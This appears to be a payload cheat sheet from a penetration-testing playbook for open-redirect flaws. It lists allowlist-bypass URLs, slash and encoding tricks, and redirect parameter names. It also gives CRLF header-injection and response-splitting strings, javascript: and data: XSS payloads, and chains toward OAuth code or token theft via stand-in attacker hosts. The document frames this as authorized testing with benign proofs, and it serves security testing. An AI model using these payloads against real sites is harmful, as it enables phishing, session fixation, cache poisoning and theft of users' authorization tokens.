# Open redirect payloads + allowlist bypasses (step 3)
# Point the destination at YOUR benign/OOB host. Record in redirect_tests.jsonl:
# {param, payload, mechanism, landed_host, external, bypassed_allowlist}.
# Replace evil.example with your controlled host.

## Baseline
```
https://evil.example
//evil.example                 # scheme-relative (no https:)
/\evil.example
https:/evil.example
https:evil.example
```

## Allowlist bypasses (when the app checks for its own domain)
```
https://TARGET.com.evil.example           # post-domain: suffix looks like TARGET.com
https://evil.example/TARGET.com           # TARGET.com in path, not host
https://evil.example#TARGET.com
https://evil.example?TARGET.com
https://TARGET.com@evil.example           # userinfo — real host is evil.example
https://evil.example\@TARGET.com
//TARGET.com@evil.example
https://TARGET.com.evil.example/
http://TARGET.com                         # scheme downgrade if only https checked
```

## Encoding / parser tricks
```
%2f%2fevil.example                        # encoded //
%5cevil.example                           # \
https://evil%E3%80%82example              # unicode ideographic full stop as dot
/%09/evil.example                         # tab
https://evil.example%2f%2e%2e
```

## CRLF (if the param flows into the Location header unsanitized → header injection)
```
/%0d%0aLocation:https://evil.example
```

## Client-side (JS location sink) → also XSS primitive
```
javascript:alert(document.domain)
```

Identify the mechanism (server 3xx vs JS `location` vs `meta refresh`), find the lowest payload that
lands on your external host, and note any chain (OAuth `redirect_uri`, SSRF, `javascript:`→XSS).

---
## Extended arsenal — redirect parameter catalog
Placeholders here: `HOST` = the app's own allowlisted domain; `evil.example` / `TOKEN.oob.example` =
your controlled landing host. Fuzz each param name with a benign payload that lands on your host.
```
next  url  redirect  redirect_uri  redirect_url  redirectUrl  redirect_to  return  returnTo  return_to
return_url  returnurl  continue  continueUrl  dest  destination  go  goto  out  link  to  target  from
r  u  redir  rurl  forward  forward_url  success  success_url  cancel  cancelUrl  login_url  logout_url
image  image_url  imageurl  view  path  domain  host  site  callback  callbackUrl  ref  referrer
back  backurl  service  data  file  page  window  checkout_url  origin  requestUrl  ReturnUrl
```
Also check: values inside JSON bodies, `Referer`-driven "go back", `?next=` on login/logout, and any
param that ends up in a `Location:` header or a JS `location.*` sink.

---
## Extended arsenal — slash / scheme obfuscation matrix
Lowest-strength payload that still lands on `evil.example` is the finding.

| Payload | Idea |
|---|---|
| `//evil.example` | scheme-relative; browser adds the current scheme |
| `///evil.example`  `////evil.example` | extra slashes; some parsers drop the empty authority |
| `/\/\evil.example` | mixed slash/backslash |
| `/\evil.example`  `\/evil.example`  `\\evil.example` | backslash variants (WHATWG treats `\`=`/`) |
| `https:/evil.example`  `https:evil.example` | single-/no-slash scheme |
| `https:/\evil.example` | slash+backslash |
| `/%2fevil.example`  `%2f%2fevil.example` | encoded slashes |
| `/%5cevil.example`  `%5c%5cevil.example` | encoded backslashes |
| `/%09/evil.example`  `/%0d/evil.example`  `/%0a/evil.example` | tab / CR / LF after slash |
| `/%00/evil.example`  `/ /evil.example` | null / space |
| `//evil.example/%2e%2e` | path dot-segments after the host |
| `//evil%E3%80%82example` | unicode ideographic dot inside the host |

---
## Extended arsenal — host confusion & allowlist-domain-embedded bypasses
App checks the destination "contains" or "ends with" its own domain (`HOST`). Defeat the check:
```
https://HOST@evil.example/            # userinfo — real host is evil.example
https://HOST%40evil.example/          # encoded @
https://evil.example/HOST             # HOST in the path
https://evil.example/?x=HOST          # HOST in the query
https://evil.example/#HOST            # HOST in the fragment
https://evil.example\@HOST/            # backslash before @ (parser split)
//HOST@evil.example                   # scheme-relative + userinfo
https://HOST.evil.example/            # HOST as a subdomain label of evil.example
https://HOSTevil.example/             # missing dot — a "startswith HOST" check fails open
https://HOST-evil.example/            # lookalike registered domain
https://evil.example/HOST/..          # path that appears to contain HOST
https://HOST.evil.example.HOST/       # HOST on both ends; real host is evil.example.*
http://HOST/                          # scheme downgrade if only https is validated
```
IDN / enclosed-char host confusion (normalized to ASCII after the check):
```
https://HOST。evil.example/           # U+3002 ideographic full stop
https://HOST｡evil.example/            # U+FF61 halfwidth
https://ⒽⓄⓈⓉ.evil.example/           # enclosed alphanumerics
```

---
## Extended arsenal — scheme-based payloads (client-side sinks → XSS/data)

| Scheme | Use | Confirm |
|---|---|---|
| `javascript:...` | JS `location`/`a.href` sink → script exec | benign `print()`/DOM read; hand to xss-dom |
| `data:text/html,...` | render attacker HTML | benign marker; hand to xss |
| `vbscript:...` | legacy engine sink | note only |
| `blob:` / `filesystem:` | some SPA routers | note only |

```
javascript:/*--></title></style></textarea></script><svg onload=/* benign marker */>//
data:text/html;base64,<b64 of a benign marker page>
```
Only the server-3xx `Location:` path yields a classic open redirect; `javascript:`/`data:` bite only where
the destination flows into a client-side navigation sink. Identify the mechanism first.

---
## Extended arsenal — CRLF → header injection / response-splitting combos
When the param flows UNSANITIZED into the `Location` header you can inject headers (sometimes a body).
```
/redirect?url=https://evil.example%0d%0aSet-Cookie:%20sessfix=1          # cookie injection / fixation
/redirect?url=/%0d%0aLocation:%20https://evil.example                   # override Location
/redirect?url=/%0d%0aX-RS:%20canary                                     # prove header injection benignly
/redirect?url=/%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200...   # response split (-> cache)
```
Confirm benignly by injecting an inert `X-RS: canary` header on YOUR OWN response. A cached split is cache
poisoning — buster-scope it and hand to the cache-poisoning skill; never poison real users. XSS via an
injected body → hand to xss.

---
## Extended arsenal — DOM / client-side open redirect
Source → navigation sink, entirely client-side (no server 3xx):
```
Sources: location.hash  location.search  document.referrer  postMessage data  window.name
         localStorage/sessionStorage  path segments parsed by the SPA router
Sinks:   location = x    location.href = x    location.assign(x)    location.replace(x)
         window.open(x)  <a href> set from x  history.pushState / framework router .push(x)
# Fragment-based (never sent to the server):
https://HOST/#/redirect?to=https://evil.example
```
Confirm: the browser navigates to `evil.example` / `TOKEN.oob.example` driven by the client sink.

---
## Extended arsenal — chaining feasibility (what an open redirect buys)

| Chain | Mechanism | Benign proof |
|---|---|---|
| OAuth code/token theft | allowlisted `redirect_uri` + an open redirect WITHIN the allowed origin bounces `?code=`/`#access_token=` onward | land the code/token on `TOKEN.oob.example` (TEST client); hand to oauth |
| SSRF reach | a server-side fetcher follows the 3xx to an internal host | OOB from target egress; hand to ssrf-* |
| Credential phishing | realistic origin → attacker page | describe only; do NOT phish real users |
| Token/secret leak via Referer | redirect to attacker; sensitive data in URL/Referer | show the Referer/query reaching `TOKEN.oob.example` |
| SSRF/WAF first-hop allowlist bypass | on-site redirect as the trusted first hop | see ssrf redirect-reach |
| CSP / anti-CSRF weakening | same-origin redirect to an attacker-influenced path | note feasibility |

OAuth is the highest-value chain: an open redirect on a page the IdP's `redirect_uri` allowlist trusts can
forward the authorization `code` (or implicit `#access_token`) to your host. Prove with a TEST client
landing on `TOKEN.oob.example`; never capture real users' codes. Full validation → oauth skill.

---
## Extended arsenal — mechanism × payload map + benign-proof protocol

| Mechanism | Detect | Payloads that bite |
|---|---|---|
| Server 3xx (`Location`) | `curl -sI` shows 30x + `Location` | `//`, `/\`, `@`, encoded slashes, CRLF |
| JS `location.*` | sink set from param/hash | `javascript:`, `data:`, `//`, `@` |
| `<meta http-equiv=refresh>` | HTML meta carries the URL | `//`, `http(s):`, `data:` |

```
curl -sI "https://HOST/redirect?url=//evil.example"      # expect: Location: //evil.example -> lands on your host
```
Record `{param, payload, mechanism, landed_host=TOKEN.oob.example, external, bypassed_allowlist}`. Keep it
benign: your own controlled host only, no real-user redirection.
